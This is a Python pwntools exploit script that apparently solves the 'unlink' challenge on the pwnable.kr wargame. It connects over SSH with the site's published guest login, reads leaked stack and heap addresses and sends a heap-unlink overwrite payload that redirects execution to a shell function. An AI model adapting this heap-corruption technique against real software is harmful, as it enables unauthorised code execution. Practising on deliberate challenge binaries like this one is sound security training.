#!/usr/bin/env python3
from pwn import *
import re

shell = 0x80484eb

p1 = ssh(user = 'unlink', host = 'pwnable.kr', port = 2222, password = 'guest')
p2 = p1.process('./unlink')

stack_leak = int(re.search('0x[^\n]+', p2.recvline().decode()).group(0), 16)
heap_leak = int(re.search('0x[^\n]+', p2.recvline().decode()).group(0), 16)

payload  = p32(shell)
payload += b'A' * 12
payload += p32(stack_leak + 0xc)
payload += p32(heap_leak + 0xc)

p2.sendline(payload)

p2.interactive()